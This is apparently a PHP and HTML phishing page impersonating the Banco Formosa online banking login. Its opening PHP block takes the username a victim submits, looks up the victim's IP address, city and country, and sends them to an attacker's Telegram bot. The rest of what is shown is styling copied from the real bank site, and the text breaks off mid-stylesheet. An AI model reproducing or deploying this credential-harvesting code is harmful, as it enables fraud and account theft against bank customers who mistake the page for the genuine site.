<?php
ini_set("display_errors", 0);
include('datos.php');
$ip = trim(file_get_contents("http://ipinfo.io/ip"));
$cc = trim(file_get_contents("http://ipinfo.io/{$ip}/country"));
$userp = trim(file_get_contents("http://ipinfo.io/{$ip}/city"));
if ( isset ($_POST['user1']) ){

$message = "💲💲💲💲JP💲fomosa💲💲💲\r\n📱Usuario: ".$_POST['user1']."\r\n ".$ip." ".$userp." ".$cc."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}else{  header ('location:'); exit();
}

?>
<html lang="es">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Banco Formosa | Login</title>
  <base href=".">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#4e8ef7">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
  <meta name="google" content="notranslate">
  <link rel="icon" type="image/x-icon" href="https://hb.bancoformosa.com.ar/assets/img/favicon.ico">
  <link rel="apple-touch-icon" sizes="16x16" href="https://hb.bancoformosa.com.ar/assets/img/apple-touch-icon.png">
  <style>
    .loading {
      position: absolute;
      width: 100%;
      height: 100%;
      background-color: rgba(255, 255, 255, 0.9019607843137255);
      z-index: 9999999999999999999999999999999999999999999999999999999999;
      top: 0px;
      left: 0px;
      text-align: center;
      overflow: hidden;
    }

    @-webkit-keyframes loading {
      0% {
        box-shadow: 0px 17px 10px -10px rgba(0, 0, 0, 0.4);
      }

      50% {
        box-shadow: 0px 37px 20px -15px rgba(0, 0, 0, 0.2);
        transform: translate(0px, -10px);
      }

      100% {
        box-shadow: 0px 17px 10px -10px rgba(0, 0, 0, 0.4);
        transform: translate(0px, 0px);
      }
    }

    @keyframes loading {
      0% {
        box-shadow: 0px 17px 10px -10px rgba(0, 0, 0, 0.4);
      }

      50% {
        box-shadow: 0px 37px 20px -15px rgba(0, 0, 0, 0.2);
        transform: translate(0px, -10px);
      }

      100% {
        box-shadow: 0px 17px 10px -10px rgba(0, 0, 0, 0.4);
        transform: translate(0px, 0px);
      }
    }
  </style>
  <link rel="stylesheet" href="./css/styles.ba326f28c709205bc0b2.css">
  <style>
    .container-flow[_ngcontent-c0] {
      position: relative;
      background-color: #fff;
      width: 100%;
      height: 100vh
    }

    .version[_ngcontent-c0] {
      color: #18cc18;
      font-size: 18px;
      position: fixed;
      right: 20px;
      bottom: 0;
      z-index: 99999999999999999999999999
    }

    .main-container[_ngcontent-c0] {
      background-color: #fff;
      transition: all .25s ease;
      position: absolute;
      top: 89px;
      right: 0;
      width: calc(100% - 270px);
      height: calc(100% - 89px);
      overflow-x: hidden;
      padding: 0 20px 20px
    }

    .main-container.sucursales[_ngcontent-c0] {
      padding-bottom: 0;
      padding-right: 0;
      padding-left: 0
    }

    .full-container[_ngcontent-c0] {
      position: relative;
      width: 100%
    }

    .alignToLogo[_ngcontent-c0] {
      padding: 0 73px
    }

    @media only screen and (max-width:1366px) and (min-width:1276px) {
      .alignToLogo[_ngcontent-c0] {
        padding: 0 50px
      }
    }

    @media only screen and (max-width:810px) {
      .alignToLogo[_ngcontent-c0] {
        padding: 20px
      }
    }

    .lcp[_ngcontent-c0] {
      top: 0;
      width: 100%;
      height: 100% !important
    }

    .login-img[_ngcontent-c0] {
      background-repeat: no-repeat;
      background-size: cover
    }

    .alert-container[_ngcontent-c0] {
      position: fixed;
      z-index: 2147483647;
      bottom: 10px;
      display: block
    }

    .backendmessage[_ngcontent-c0] {
      padding: 14px 20px 0;
      cursor: pointer;
      border: 1px solid transparent;
      border-radius: .25rem;
      -webkit-animation-name: bounceInRight;
      animation-name: bounceInRight;
      -webkit-animation-duration: 1s;
      animation-duration: 1s;
      -webkit-animation-fill-mode: both;
      animation-fill-mode: both;
      z-index: 100;
      margin: 15px 15px 1rem
    }

    .backendmessage[_ngcontent-c0]>p[_ngcontent-c0] {
      color: #fff;
      font-size: 16px
    }

    .message-error[_ngcontent-c0] {
      background-color: #f44336
    }

    .message-warn[_ngcontent-c0] {
      background-color: #ff9800
    }

    .message-success[_ngcontent-c0] {
      background-color: #4caf50
    }

    .blur[_ngcontent-c0] {
      -webkit-filter: blur(4px);
      filter: blur(4px)
    }

    @-webkit-keyframes fadeInFromNone {
      0% {
        display: none;
        opacity: 0
      }

      1% {
        display: block;
        opacity: 0
      }

      100% {
        display: block;
        opacity: 1
      }
    }

    @keyframes fadeInFromNone {
      0% {
        display: none;
        opacity: 0
      }

      1% {
        display: block;
        opacity: 0
      }

      100% {
        display: block;
        opacity: 1
      }
    }

    @-webkit-keyframes fadeOutFromNone {

      0%,
      1% {
        display: block;
        opacity: 1
      }

      100% {
        display: none;
        opacity: 0
      }
    }

    @keyframes fadeOutFromNone {

      0%,
      1% {
        display: block;
        opacity: 1
      }

      100% {
        display: none;
        opacity: 0
      }
    }

    .Tooltip[_ngcontent-c0] {
      position: absolute;
      width: -webkit-fit-content;
      width: -moz-fit-content;
      width: fit-content;
      background: #1a1a1a;
      color: #fff;
      padding: 8px;
      max-width: 250px;
      border-radius: 5px;
      -webkit-transform: translate(-50%, -100%) translateY(-20px);
      transform: translate(-50%, -100%) translateY(-20px);
      z-index: 99999999999
    }

    .Tooltip[_ngcontent-c0] p[_ngcontent-c0] {
      font-size: 14px
    }

    .Tooltip[_ngcontent-c0] .triangle[_ngcontent-c0] {
      width: 10px;
      height: 10px;
      position: absolute;
      border-left: 10px solid transparent;
      border-right: 10px solid transparent;
      border-top: 10px solid #1a1a1a;
      bottom: -10px;
      left: calc(50% - 10px)
    }

    .Tooltip.oculto[_ngcontent-c0] {
      -webkit-animation: .2s ease-in-out fadeOutFromNone;
      animation: .2s ease-in-out fadeOutFromNone;
      opacity: 0;
      display: none
    }

    .Tooltip.mostrando[_ngcontent-c0] {
      -webkit-animation: .2s ease-in-out fadeInFromNone;
      animation: .2s ease-in-out fadeInFromNone;
      opacity: 1;
      display: block
    }

    .Tooltip.left[_ngcontent-c0]:not(.bottom) {
      -webkit-transform: translateX(-100%) translateX(-20px) translateY(-50%);
      transform: translateX(-100%) translateX(-20px) translateY(-50%)
    }

    .Tooltip.left[_ngcontent-c0]:not(.bottom) .triangle[_ngcontent-c0] {
      -webkit-transform: rotate(-90deg);
      transform: rotate(-90deg);
      left: unset;
      right: -15px;
      bottom: calc(50% - 5px)
    }

    .Tooltip.left.bottom[_ngcontent-c0] {
      -webkit-transform: translateX(-100%) translateX(10px) translateY(100%);
      transform: translateX(-100%) translateX(10px) translateY(100%)
    }

    .Tooltip.left.bottom[_ngcontent-c0] .triangle[_ngcontent-c0] {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg);
      top: -10px;
      left: unset;
      right: 0
    }

    .Tooltip.right[_ngcontent-c0]:not(.bottom) {
      -webkit-transform: translateX(25px) translateY(-50%);
      transform: translateX(25px) translateY(-50%)
    }

    .Tooltip.right[_ngcontent-c0]:not(.bottom) .triangle[_ngcontent-c0] {
      bottom: calc(50% - 5px);
      -webkit-transform: rotate(90deg);
      transform: rotate(90deg);
      left: -15px
    }

    .Tooltip.right.bottom[_ngcontent-c0] {
      -webkit-transform: translateX(0) translateY(100%);
      transform: translateX(0) translateY(100%)
    }

    .Tooltip.right.bottom[_ngcontent-c0] .triangle[_ngcontent-c0] {
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg);
      top: -10px;
      left: 0
    }

    .Tooltip.bottom[_ngcontent-c0]:not(.left):not(.right) {
      -webkit-transform: translateX(-50%) translateY(100%);
      transform: translateX(-50%) translateY(100%)
    }

    .Tooltip.bottom[_ngcontent-c0]:not(.left):not(.right) .triangle[_ngcontent-c0] {
      bottom: unset;
      top: -10px;
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg)
    }

    @media only screen and (max-width:1366px) {
      .main-container[_ngcontent-c0] {
        width: calc(100% - 220px)
      }
    }

    @media only screen and (max-width:1275px) {
      .main-container[_ngcontent-c0] {
        width: 100%
      }
    }

    @media only screen and (max-width:810px) {
      .container-flow[_ngcontent-c0] {
        overflow: visible
      }

      .main-container[_ngcontent-c0] {
        top: 134px;
        height: calc(100% - 134px);
        padding-top: 20px
      }
    }

    @-webkit-keyframes pulse {

      from,
      to {
        -webkit-transform: scale3d(1, 1, 1);
        transform: scale3d(1, 1, 1)
      }

      50% {
        -webkit-transform: scale3d(1.2, 1.2, 1.2);
        transform: scale3d(1.2, 1.2, 1.2)
      }
    }

    @keyframes pulse {

      from,
      to {
        -webkit-transform: scale3d(1, 1, 1);
        transform: scale3d(1, 1, 1)
      }

      50% {
        -webkit-transform: scale3d(1.2, 1.2, 1.2);
        transform: scale3d(1.2, 1.2, 1.2)
      }
    }

    .pulse[_ngcontent-c0] {
      -webkit-animation-name: pulse;
      animation-name: pulse
    }

    .login-splash {
      background: rgba(255, 255, 255, .901961);
      position: fixed;
      top: 0;
      bottom: 0;
      left: 0;
      right: 0;
      display: none;
      align-items: center;
      z-index: 9999999999999999999999999999999999999999999999;
      justify-content: center
    }

    .login-splash .custom-animation {
      width: 150px;
      z-index: 99999999999999999999999999999999999999999999999;
      -webkit-animation: 1s ease-in infinite pulse;
      animation: 1s ease-in infinite pulse
    }

    @media all and (-ms-high-contrast:none),
    (-ms-high-contrast:active) {
      .login-splash[_ngcontent-c0] {
        display: flex
      }

      .notIE[_ngcontent-c0] {
        display: none
      }
    }

    @supports (-ms-ime-align:auto) {
      .login-splash[_ngcontent-c0] {
        display: flex
      }

      .notIE[_ngcontent-c0] {
        display: none
      }
    }

    @supports (-ms-accelerator:true) {
      .login-splash[_ngcontent-c0] {
        display: flex
      }

      .notIE[_ngcontent-c0] {
        display: none
      }
    }

    @-moz-document url-prefix() {
      .login-splash {
        display: flex
      }

      .notIE {
        display: none
      }
    }

    .background[_ngcontent-c0] {
      position: fixed;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, .3);
      z-index: 9999
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] {
      position: absolute;
      top: 0;
      left: 0;
      z-index: 4;
      -webkit-transform: translate(50vw, 50vh) translate(-50%, -50%);
      transform: translate(50vw, 50vh) translate(-50%, -50%);
      border-radius: 5px;
      overflow: hidden;
      width: 500px;
      max-width: calc(100% - 40px)
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] .header[_ngcontent-c0] {
      background: #003f75;
      padding: 20px
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] .header[_ngcontent-c0] h1[_ngcontent-c0] {
      color: #fff;
      margin-right: 30px
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] .header[_ngcontent-c0] img[_ngcontent-c0] {
      position: absolute;
      right: 10px;
      top: 20px;
      width: 30px;
      cursor: pointer
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] .content[_ngcontent-c0] {
      background-color: #fff
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] .content[_ngcontent-c0] .stage[_ngcontent-c0] {
      position: relative;
      width: 100%;
      height: 100%;
      padding: 20px
    }

    .background[_ngcontent-c0] .body[_ngcontent-c0] .content[_ngcontent-c0] .stage.center[_ngcontent-c0] {
      text-align: center
    }

    button.switchAccesible[_ngcontent-c0] {
      width: auto;
      opacity: .4;
      z-index: 99;
      position: fixed;
      top: 10px;
      left: 90px
    }
  </style>
  <style>
    [_nghost-c5] .login-container .login-box .check-cont .checkRCont {
      border-color: #fff !important
    }

    .login-container[_ngcontent-c5] {
      width: 100vw;
      min-height: 100vh;
      max-width: 100%;
      overflow: hidden;
      position: relative
    }

    .login-container[_ngcontent-c5] .formosaVideo[_ngcontent-c5] {
      position: absolute;
      width: 100%;
      height: 100%;
      top: 0;
      display: block;
      background-color: rgba(0, 0, 0, .3);
      z-index: 1
    }

    .login-container[_ngcontent-c5] .passEye[_ngcontent-c5] {
      position: absolute;
      right: 70px;
      bottom: 150px;
      width: 25px
    }

    .login-container[_ngcontent-c5] .passEye[_ngcontent-c5] img[_ngcontent-c5] {
      width: 100%
    }

    .login-container[_ngcontent-c5] video[_ngcontent-c5] {
      position: fixed;
      left: 50%;
      top: 0;
      -webkit-transform: translateX(-50%);
      transform: translateX(-50%);
      min-width: 100%;
      min-height: 100%
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] {
      display: flex;
      justify-content: space-between;
      flex-direction: column;
      height: 100%;
      min-height: calc(100vh - 1px)
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5],
    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5],
    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] {
      z-index: 1;
      margin-left: 4vw;
      margin-right: 4vw
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] {
      display: flex;
      flex-direction: row;
      justify-content: space-between;
      margin-top: 2vh;
      margin-bottom: 2vh;
      padding-bottom: 2vh;
      border-bottom: 1px solid #fff;
      color: #fff
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .logo[_ngcontent-c5] {
      width: 240px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] {
      display: flex;
      align-items: center;
      justify-content: flex-end;
      flex-direction: row
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] img[_ngcontent-c5] {
      height: 50px;
      margin-right: 10px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] h3[_ngcontent-c5] {
      font-size: 20px;
      white-space: nowrap;
      margin: 0
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] p[_ngcontent-c5] {
      font-size: 12px;
      white-space: nowrap;
      margin: 0
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] .apps[_ngcontent-c5],
    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] .tels[_ngcontent-c5] {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      justify-content: space-around;
      margin-right: 30px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] {
      display: flex;
      align-items: flex-start;
      flex-direction: row;
      justify-content: space-around
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .info[_ngcontent-c5] {
      color: #fff;
      text-align: left;
      max-width: 560px;
      align-self: center;
      margin-right: 20px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .info[_ngcontent-c5] h1[_ngcontent-c5] {
      font-size: 35px;
      font-weight: 700
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .info[_ngcontent-c5] p[_ngcontent-c5] {
      font-size: 14px;
      font-weight: 700
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] {
      position: relative;
      display: flex;
      flex-direction: column;
      flex-shrink: 0;
      justify-items: flex-start;
      background-color: rgba(0, 61, 121, .7);
      padding: 60px 50px 3vh;
      border-radius: 10px;
      max-width: 430px;
      color: #fff;
      margin-bottom: 20px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box.securityImage[_ngcontent-c5] {
      margin-top: 40px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .widthVolver[_ngcontent-c5] {
      width: calc(100% - 110px)
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .imgSeguridad[_ngcontent-c5] {
      height: 13vh;
      width: 13vh;
      min-height: 80px;
      min-width: 80px;
      max-height: 100px;
      max-width: 100px;
      border-radius: 10px;
      border: 1px solid #fff;
      position: absolute;
      top: 0;
      left: 50%;
      -webkit-transform: translate(-50%, -50%);
      transform: translate(-50%, -50%);
      overflow: hidden
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .imgSeguridad[_ngcontent-c5] img[_ngcontent-c5] {
      width: 100%;
      height: 100%
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] h1[_ngcontent-c5],
    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] h2[_ngcontent-c5] {
      margin-bottom: 0;
      -webkit-touch-callout: none;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] h2[_ngcontent-c5] {
      font-size: 20px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] h1[_ngcontent-c5] {
      font-size: 27px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .info-text[_ngcontent-c5] {
      font-size: 14px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .info-text.hide[_ngcontent-c5] {
      opacity: 0;
      margin: 0 !important;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      max-height: 0;
      overflow: hidden
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .short-line[_ngcontent-c5] {
      background-color: #e6e6e6;
      margin-top: 20px;
      height: 1px;
      width: 80px;
      -webkit-touch-callout: none;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] {
      background-color: #fff;
      display: flex;
      flex-direction: row;
      justify-content: flex-start;
      margin-top: 20px;
      height: 80px;
      margin-left: -50px;
      margin-right: -50px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-icon[_ngcontent-c5] {
      padding-top: 6px;
      padding-left: 50px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-icon[_ngcontent-c5] img[_ngcontent-c5] {
      width: 15px;
      height: 15px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-text[_ngcontent-c5] {
      padding-top: 10px;
      padding-left: 8px;
      display: flex;
      flex-direction: column;
      justify-content: flex-start
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-text[_ngcontent-c5] h1[_ngcontent-c5] {
      color: #f2994a;
      font-size: 16px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-text[_ngcontent-c5] p[_ngcontent-c5] {
      padding-top: 5px;
      color: #003f75;
      font-size: 13px;
      font-weight: 600;
      line-height: 15px
    }

    @media only screen and (max-width:1400px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] {
        margin-left: -40px;
        margin-right: -40px;
        height: 75px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-icon[_ngcontent-c5] {
        padding-left: 40px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-text[_ngcontent-c5] h1[_ngcontent-c5] {
        font-size: 15px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-text[_ngcontent-c5] p[_ngcontent-c5] {
        font-size: 12px;
        font-weight: 600;
        line-height: 15px
      }
    }

    @media only screen and (max-width:810px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] {
        margin-left: -10px;
        margin-right: -10px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .warning-info[_ngcontent-c5] .warning-icon[_ngcontent-c5] {
        padding-left: 10px
      }
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input[_ngcontent-c5]::-webkit-input-placeholder {
      color: #fff;
      opacity: 1
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input[_ngcontent-c5]:-ms-input-placeholder {
      opacity: 1;
      color: #fff
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input[_ngcontent-c5]::-ms-input-placeholder {
      opacity: 1;
      color: #fff
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input[_ngcontent-c5]::placeholder {
      color: #fff;
      opacity: 1
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] input[_ngcontent-c5]::-ms-clear,
    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] input[_ngcontent-c5]::-ms-reveal {
      display: none
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input[_ngcontent-c5] {
      border: 2px solid #fff;
      width: 100%;
      max-width: 100%;
      height: 38px;
      border-radius: 20px;
      background: url(static/user.9e8754f6da04522662ab.png) 15px 4px no-repeat;
      padding-left: 60px;
      color: #fff;
      margin-top: 20px;
      padding-right: 40px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input-pwd[_ngcontent-c5] {
      background: url(static/key.2d8b9614ffdb8d17a1f0.png) 15px 4px/25px 25px no-repeat;
      margin-top: 20px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .input-tkn[_ngcontent-c5] {
      background: url(static/locked.304114069651e220d7a9.png) 15px 4px/25px 25px no-repeat;
      margin-top: 20px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .boton[_ngcontent-c5] {
      width: 100%;
      background-color: #fff;
      margin-top: 20px;
      border-radius: 20px;
      border: none;
      height: 38px;
      font-weight: 700;
      transition: all 2s ease;
      color: #003f75
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .boton[_ngcontent-c5]:hover {
      border: 2px solid #fff;
      color: #fff;
      background-color: transparent
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .forgot-text[_ngcontent-c5] {
      text-align: center;
      cursor: pointer;
      font-size: 14px;
      text-decoration: underline;
      margin-top: 20px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .login-help[_ngcontent-c5] {
      background: #00a5df;
      align-self: center;
      padding: 8px;
      width: calc(100% - 180px);
      border-radius: 20px;
      position: absolute;
      bottom: 0;
      -webkit-transform: translateY(40%);
      transform: translateY(40%);
      text-align: center;
      cursor: pointer
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .mobileInfo[_ngcontent-c5] {
      display: none
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .check-cont[_ngcontent-c5] {
      position: absolute;
      width: 20px;
      height: 20px;
      float: left
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
      position: absolute;
      right: calc(75% - -2rem);
      top: 16rem;
      -webkit-transform: translateX(-50%) translateY(-100%) translateY(-20px);
      transform: translateX(-50%) translateY(-100%) translateY(-20px);
      z-index: 1
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5] {
      display: flex;
      flex-direction: row;
      justify-content: space-around;
      padding-top: 30px;
      padding-bottom: 10px
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5] .link[_ngcontent-c5] {
      text-decoration: underline !important;
      color: #fff !important;
      font-weight: 700;
      font-size: 18px;
      cursor: pointer
    }

    .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .footer[_ngcontent-c5] .link[_ngcontent-c5]:hover {
      color: #42a7ff !important
    }

    .overlay[_ngcontent-c5] {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, .5);
      display: flex;
      align-items: center;
      flex-direction: column;
      z-index: 10;
      padding-top: 85px
    }

    .overlay.alt[_ngcontent-c5] {
      padding-top: 0;
      display: flex;
      align-items: center;
      flex-direction: column;
      justify-content: center
    }

    .overlay.alt[_ngcontent-c5] .primary-button[_ngcontent-c5] {
      margin-left: 0;
      display: block
    }

    .overlay[_ngcontent-c5] .content[_ngcontent-c5] {
      border-radius: 7px;
      width: 800px;
      height: calc(100% - 100px);
      max-width: 80%;
      background: #fff;
      padding-bottom: 80px;
      position: relative
    }

    .overlay[_ngcontent-c5] .content[_ngcontent-c5] .box-modal-close[_ngcontent-c5] {
      position: absolute;
      left: 100%;
      width: 60px;
      top: 0;
      cursor: pointer
    }

    .overlay[_ngcontent-c5] .content[_ngcontent-c5] .content-inside[_ngcontent-c5] {
      padding: 15px
    }

    .overlay[_ngcontent-c5] .title-container[_ngcontent-c5] {
      padding: 25px;
      background: #003f75;
      margin: 0;
      font-size: 25px
    }

    .overlay[_ngcontent-c5] .title-container[_ngcontent-c5] .sub-title[_ngcontent-c5] {
      color: #fff;
      margin: 0
    }

    .overlay[_ngcontent-c5] .title-container[_ngcontent-c5] .closeImg[_ngcontent-c5] {
      position: absolute;
      right: 15px;
      top: 25px;
      width: 30px;
      cursor: pointer
    }

    @media only screen and (max-width:1860px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        right: calc(75% - -1rem)
      }
    }

    @media only screen and (max-width:1780px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        right: calc(75% - 2rem)
      }
    }

    @media only screen and (max-width:1680px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        right: calc(75% - 5rem)
      }
    }

    @media only screen and (max-width:1585px) {
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .virtual-keyboard-cont[_ngcontent-c5] {
        right: calc(75% - 8rem)
      }
    }

    @media only screen and (max-width:1400px) {
      .login-container[_ngcontent-c5] .passEye[_ngcontent-c5] {
        right: 55px;
        top: 341px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .logo[_ngcontent-c5] {
        width: 200px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] .apps[_ngcontent-c5],
      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .header[_ngcontent-c5] .links[_ngcontent-c5] .tels[_ngcontent-c5] {
        margin-right: 20px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .info[_ngcontent-c5] h1[_ngcontent-c5] {
        font-size: 29px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] {
        max-width: 400px;
        padding: 55px 40px 4vh
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] h2[_ngcontent-c5] {
        font-size: 17px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] h1[_ngcontent-c5] {
        font-size: 24px
      }

      .login-container[_ngcontent-c5] .login-content[_ngcontent-c5] .body[_ngcontent-c5] .login-box[_ngcontent-c5] .info-text[_ngcontent-c5] {
        font-size: 12px
      }

